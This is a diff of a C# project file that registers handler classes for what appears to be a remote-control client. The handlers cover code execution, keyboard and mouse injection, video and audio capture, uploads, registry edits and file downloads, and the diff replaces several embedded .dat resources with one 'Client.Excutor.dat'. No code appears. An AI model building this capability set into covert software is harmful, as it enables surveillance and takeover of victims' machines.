@@ -122,6 +122,15 @@
     <Compile Include="Handlers\RequestMsgBoxHandler.cs" />
     <Compile Include="Handlers\RequestOpeCDHandler.cs" />
     <Compile Include="Handlers\RequestPlayMusicHandler.cs" />
+    <Compile Include="Handlers\RequestDownloadWebFileHandler.cs" />
+    <Compile Include="Handlers\RequestMouseEventHandler.cs" />
+    <Compile Include="Handlers\RequestKeyboardEventHandler.cs" />
+    <Compile Include="Handlers\RequestOpenFileHandler.cs" />
+    <Compile Include="Handlers\RequestCaptureVideoHandler.cs" />
+    <Compile Include="Handlers\RequestUploadHandler.cs" />
+    <Compile Include="Handlers\RequestExecCodeHandler.cs" />
+    <Compile Include="Handlers\RequestQuitAppHandler.cs" />
+    <Compile Include="Handlers\RequestRestartAppHandler.cs" />
     <Compile Include="Services\CaptureVideoClient.cs" />
     <Compile Include="Handlers\RequestOpeRegistryValueNameHandler.cs" />
     <Compile Include="Handlers\RequestCaptureAudioHandler.cs" />
@@ -162,11 +171,7 @@
   </ItemGroup>
   <ItemGroup>
     <None Include="app.manifest" />
-    <EmbeddedResource Include="Res\BlackScreen.dat" />
-    <EmbeddedResource Include="Res\CamCapture.dat" />
-    <EmbeddedResource Include="Res\Downloader.dat" />
-    <EmbeddedResource Include="Res\MsgBox.dat" />
-    <EmbeddedResource Include="Res\MusicPlayer.dat" />
+    <EmbeddedResource Include="Res\Client.Excutor.dat" />
   </ItemGroup>
   <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
